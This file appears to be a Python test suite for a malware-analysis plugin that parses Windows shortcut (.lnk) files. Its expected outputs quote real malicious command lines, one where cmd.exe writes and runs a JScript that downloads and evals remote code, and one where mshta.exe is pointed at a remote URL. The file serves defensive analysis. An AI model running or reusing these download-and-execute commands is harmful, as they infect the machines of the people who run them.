"""
Lnk Shortcut test suite
=======================

"""

import datetime

from azul_runner import FV, Event, Filepath, JobResult, State, test_template

from azul_plugin_shortcut.main import AzulPluginShortcut


class TestExecute(test_template.TestPlugin):
    PLUGIN_TO_TEST = AzulPluginShortcut

    def test_malicious_lnk1(self):
        """Lnk invoking ActiveX download"""
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "7ccb8a50afa675bcba87788d7364db5a037ba507cafbe3ec5c802563f4cb505a",
                        "Malicious Windows shortcut.",
                    ),
                )
            ]
        )
        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        entity_type="binary",
                        entity_id="7ccb8a50afa675bcba87788d7364db5a037ba507cafbe3ec5c802563f4cb505a",
                        features={
                            "link_base_path": [FV(Filepath("C:\\WINDOWS\\system32\\cmd.exe"))],
                            "link_command_args": [
                                FV(
                                    '/c echo. 2>k.js&echo var l = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");l.open("GET","http://load-the-attach.com/scr/scr",false);l.send^(^);var p = l.responseText;eval^(p^);>k.js&k.js'
                                )
                            ],
                            "link_file_flag": [FV("FILE_ATTRIBUTE_ARCHIVE")],
                            "link_flag": [
                                FV("HasArguments"),
                                FV("HasExpIcon"),
                                FV("HasExpString"),
                                FV("HasIconLocation"),
                                FV("HasLinkInfo"),
                                FV("HasRelativePath"),
                                FV("HasTargetIDList"),
                                FV("HasWorkingDir"),
                                FV("IsUnicode"),
                            ],
                            "link_icon_index": [FV(1)],
                            "link_icon_location": [FV(Filepath("C:\\WINDOWS\\system32\\SHELL32.dll"))],
                            "link_info_drive_serial": [FV("0x685c785d")],
                            "link_info_drive_type": [FV("DRIVE_FIXED")],
                            "link_location": [FV("Local")],
                            "link_relative_path": [FV(Filepath("..\\..\\..\\WINDOWS\\system32\\cmd.exe"))],
                            "link_special_folder_id": [FV(37)],
                            "link_time_accessed": [
                                FV(datetime.datetime(2016, 6, 22, 1, 15, 16, 396926, tzinfo=datetime.timezone.utc))
                            ],
                            "link_time_created": [
                                FV(datetime.datetime(2008, 4, 15, 12, 0, tzinfo=datetime.timezone.utc))
                            ],
                            "link_time_modified": [
                                FV(datetime.datetime(2008, 4, 15, 12, 0, tzinfo=datetime.timezone.utc))
                            ],
                            "link_tracker_file_id": [FV("D58D6CE0-0712-11E6-B48F-D17973EE5357")],
                            "link_tracker_mac_address": [FV("d1-79-73-ee-53-57")],
                            "link_tracker_mac_prefix": [FV("d1-79-73", label="")],
                            "link_tracker_machine_id": [FV("hzx")],
                            "link_tracker_timestamp": [FV(datetime.datetime(2016, 4, 20, 16, 13, 35, 500004))],
                            "link_tracker_volume_id": [FV("A0FB13FA-60B9-4857-BAB0-C4EDCED1A216")],
                            "link_window_style": [FV("SW_SHOWMINNOACTIVE")],
                            "link_working_dir": [FV(Filepath("%temp%"))],
                        },
                    )
                ],
            ),
        )

    def test_malicious_lnk2(self):
        """Lnk mshta.exe with remote URL"""
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "2589167e23bc288f04c3bd3cf735c4df52bad4633d20c94ebaff12f99405eccd",
                        "Malicious Windows shortcut, thread actor TEMP.Armageddon.",
                    ),
                )
            ]
        )
        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        entity_type="binary",
                        entity_id="2589167e23bc288f04c3bd3cf735c4df52bad4633d20c94ebaff12f99405eccd",
                        features={
                            "link_base_path": [FV(Filepath("C:\\Windows\\System32\\mshta.exe"))],
                            "link_command_args": [FV("http://inform.bounceme.net/spool/index.html /f")],
                            "link_description": [FV("Shortcut Script")],
                            "link_file_flag": [FV("FILE_ATTRIBUTE_ARCHIVE")],
                            "link_flag": [
                                FV("HasArguments"),
                                FV("HasExpString"),
                                FV("HasIconLocation"),
                                FV("HasLinkInfo"),
                                FV("HasName"),
                                FV("HasTargetIDList"),
                                FV("HasWorkingDir"),
                                FV("IsUnicode"),
                            ],
                            "link_icon_index": [FV(114)],
                            "link_icon_location": [FV(Filepath("%Windir%\\system32\\SHELL32.dll"))],
                            "link_info_drive_serial": [FV("0xfc920caa")],
                            "link_info_drive_type": [FV("DRIVE_FIXED")],
                            "link_known_folder_id": [FV("1AC14E77-02E7-4E5D-B744-2EB1AE5198B7")],
                            "link_location": [FV("Local")],
                            "link_properties_format_id": [FV("46588AE2-4CBC-4338-BBFC-139326986DCE")],
                            "link_properties_version": [FV("0x53505331")],
                            "link_special_folder_id": [FV(37)],
                            "link_time_accessed": [
                                FV(datetime.datetime(2020, 2, 24, 1, 0, 35, 199654, tzinfo=datetime.timezone.utc))
                            ],
                            "link_time_created": [
                                FV(datetime.datetime(2020, 2, 24, 1, 0, 35, 199654, tzinfo=datetime.timezone.utc))
                            ],
                            "link_time_modified": [
                                FV(datetime.datetime(2020, 2, 24, 1, 0, 35, 199654, tzinfo=datetime.timezone.utc))
                            ],
                            "link_tracker_file_id": [FV("88FE4B6A-8097-11EA-8E19-080027BA4CBC")],
                            "link_tracker_mac_address": [FV("08-00-27-ba-4c-bc")],
                            "link_tracker_mac_prefix": [FV("08-00-27", label="PCS Systemtechnik GmbH")],
                            "link_tracker_machine_id": [FV("\xa0¤¬¨\xad-¯ª")],
                            "link_tracker_timestamp": [FV(datetime.datetime(2020, 4, 17, 10, 38, 11, 500528))],
                            "link_tracker_volume_id": [FV("CFD08F68-5856-45C6-A160-AD62A58355C4")],
                            "link_window_style": [FV("SW_SHOWNORMAL")],
                            "link_working_dir": [FV(Filepath("%WINDIR%\\System32\\"))],
                        },
                    )
                ],
            ),
        )
